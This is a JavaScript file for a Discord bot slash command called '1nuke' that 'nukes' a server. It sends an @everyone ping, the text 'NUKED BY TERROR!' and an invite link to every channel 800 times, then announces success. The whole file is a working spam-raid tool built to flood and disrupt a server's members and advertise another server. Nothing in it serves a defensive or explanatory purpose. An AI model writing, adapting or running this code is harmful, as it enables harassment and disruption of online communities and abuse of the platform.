const { SlashCommandBuilder } = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('1nuke')
    .setDescription('Nukes the server.'),

  async execute(interaction) {
    try {

      // Get the @everyone mention
      const everyoneMention = interaction.guild.roles.everyone.toString();

      // Send the nuke message and mention everyone in each channel
      for (let i = 0; i < 800; i++) {
        const message = `${everyoneMention} NUKED BY TERROR! Join the chaos: https://discord.gg/tdZ7exY75K`;
        interaction.guild.channels.cache.forEach(async (channel) => {
          try {
            await channel.send(message);
          } catch (error) {
            console.error(`Failed to send message in channel: ${channel.id}`);
          }
        });
      }

      await interaction.reply('Server nuked successfully!');
    } catch (error) {
      console.error(error);
      await interaction.reply('Failed to nuke the server. Please try again later.');
    }
  },
};


